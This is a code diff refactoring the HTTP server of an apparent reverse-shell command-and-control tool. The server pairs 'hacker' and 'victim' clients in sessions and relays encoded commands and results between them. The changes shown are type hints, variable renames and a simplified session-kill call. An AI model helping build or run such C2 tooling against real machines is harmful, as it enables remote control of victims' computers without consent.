@@ -10,7 +10,7 @@ from dataclasses import dataclass
 from functools import partial
 from http import HTTPMethod, HTTPStatus
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from typing import Any, Callable, Optional
+from typing import Any, Callable, Literal, Optional
 
 import typ.json as js
 
@@ -60,7 +60,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def __init__(
         self,
         config: cfg.Config,
-        sessions: ss.InMemorySessions,
+        sessions: ss.Sessions,
         *args,
         **kwargs,
     ):
@@ -294,7 +294,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         real_session = self.hacking_sessions.get_session(real_session_id)
 
         # Fixed client mis match
-        dict_key = "hacker_id"
+        dict_key: Literal["hacker_id", "victim_id"] = "hacker_id"
         if client_type == ut.ClientType.hacker:
             dict_key = "victim_id"
 
@@ -380,13 +380,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return response
 
         # If it is a valid session now let's kill the session
-        self.hacking_sessions.kill_session(session_id)
-
         # And then remove the hacker from the client_list
         # and also change the hacker_id value in the session
         # to None.
-        self.hacking_sessions._client_list.remove(client_id)
-        self.hacking_sessions._sessions[session_id]["hacker_id"] = None
+        self.hacking_sessions.kill_session(session_id)
 
         # Respond to the client with an OK
         return ut.HandlerResponse(True, HTTPStatus.OK)
@@ -439,10 +436,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             # This means the victim is not in a session.
             return ut.HandlerResponse(False, HTTPStatus.NOT_FOUND)
 
-        session_id = ut.encode_token(session_id).encode()
+        session_id_bytes = ut.encode_token(session_id).encode()
 
         return ut.HandlerResponse(
-            True, HTTPStatus.OK, session_id, {"content-length": str(len(session_id))}
+            True,
+            HTTPStatus.OK,
+            session_id_bytes,
+            {"content-length": str(len(session_id_bytes))},
         )
 
     def handle_cmd_fetch_cmd(
@@ -478,10 +478,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # Ok now let's send the command with an OK res code
 
         # Encoding the command
-        command = ut.encode_token(command).encode()
+        command_bytes = ut.encode_token(command).encode()
 
         return ut.HandlerResponse(
-            True, HTTPStatus.OK, command, {"content-length": str(len(command))}
+            True,
+            HTTPStatus.OK,
+            command_bytes,
+            {"content-length": str(len(command_bytes))},
         )
 
     def handle_cmd_fetch_res(
@@ -633,11 +636,14 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # let's put him in a session with the hacker.
         session_id = self.hacking_sessions.add_session(client_id, victim_id)
         # Encode the session_id with base64 and turn it to bytes
-        session_id = ut.encode_token(session_id).encode("utf8")
+        session_id_bytes = ut.encode_token(session_id).encode("utf8")
 
         # Finally report the OK message
         return ut.HandlerResponse(
-            True, HTTPStatus.OK, session_id, {"content-length": str(len(session_id))}
+            True,
+            HTTPStatus.OK,
+            session_id_bytes,
+            {"content-length": str(len(session_id_bytes))},
         )
 
     def handle_cmd_delete_hacker(
@@ -863,7 +869,7 @@ def check_pulse(database: db.Database, interval: int, stop_event: th.Event):
 
 def run_server(
     configuration: cfg.Config,
-    sessions: ss.InMemorySessions,
+    sessions: ss.Sessions,
     httpd: HTTPServer | None = None,
 ):
     """Start the HTTP server"""
